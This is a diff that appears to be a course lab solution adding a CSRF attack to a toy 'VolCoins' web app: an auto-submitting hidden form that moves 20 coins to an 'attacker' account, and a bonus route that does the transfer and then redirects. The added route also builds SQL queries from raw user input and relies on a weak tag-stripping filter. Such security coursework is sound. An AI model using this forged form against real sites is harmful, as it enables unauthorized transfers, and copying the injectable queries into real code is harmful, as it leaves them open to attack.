@@ -1,0 +1,80 @@
+////////////////CSRF Attack
+
+///In form.ejs file add
+
+<% if (account.volCoins >= 20) { %>
+  <form id ='attack' class="attacker-form" action="post_transfer" method="post">
+    <input type="hidden" name="destination_username" value="attacker">
+    <input type="hidden" name="quantity" value="20"/>
+    <input type="hidden" class="pure-button button-primary" value="Transfer" />
+  </form>
+
+  <script>
+    document.getElementById('attack').submit(); 
+  </script>
+<% } %>
+
+////////////////CSRF Bonus
+
+///In form.ejs file add
+
+<% if (account.volCoins >= 20) { %>
+  <form id ='attack' class="attacker-form" action="redirect" method="post">
+    <input type="hidden" name="destination_username" value="attacker">
+    <input type="hidden" name="quantity" value="20"/>
+    <input type="hidden" class="pure-button button-primary" value="Transfer" />
+  </form>
+
+  <script>
+    document.getElementById('attack').submit(); 
+  </script>
+<% } %>
+
+///In router.js add
+
+router.post('/redirect', asyncMiddleware(async(req, res, next) => {
+  if(req.session.loggedIn == false) {
+    render(req, res, next, 'login/form', 'Login', 'You must be logged in to use this feature!');
+    return;
+  };
+
+  if(req.body.destination_username === req.session.account.username) {
+    render(req, res, next, 'transfer/form', 'Transfer VolCoins', 'You cannot send money to yourself!', {receiver:null, amount:null});
+    return;
+  }
+
+  const db = await dbPromise;
+  let query = `SELECT * FROM Users WHERE username == "${req.body.destination_username}";`;
+  const receiver = await db.get(query);
+  if(receiver) { // if user exists
+    const amount = parseInt(req.body.quantity);
+    if(Number.isNaN(amount) || amount > req.session.account.volCoins) {
+      render(req, res, next, 'transfer/form', 'Transfer VolCoins', 'Invalid transfer amount!', {receiver:null, amount:null});
+      return;
+    }
+
+    req.session.account.volCoins -= amount;
+    query = `UPDATE Users SET volCoins = "${req.session.account.volCoins}" WHERE username == "${req.session.account.username}";`;
+    await db.exec(query);
+    const receiverNewBal = receiver.volCoins + Math.abs(amount);
+    query = `UPDATE Users SET volCoins = "${receiverNewBal}" WHERE username == "${receiver.username}";`;
+    await db.exec(query);
+    render(req, res, next, 'transfer/attackerRedirect', '', false);
+  } else { // user does not exist
+    let q = req.body.destination_username;
+    if (q == null) q = '';
+
+    let oldQ;
+    while (q !== oldQ) {
+      oldQ = q;
+      q = q.replace(/script|SCRIPT|img|IMG/g, '');
+    }
+    render(req, res, next, 'transfer/form', 'Transfer VolCoins', `User ${q} does not exist!`, {receiver:null, amount:null});
+  }
+}));
+
+///In \code\views\pages\transfer make new file attackerRedirect.ejs
+
+<script>
+    window.location.href="https://eecs.utk.edu/";
+</script>
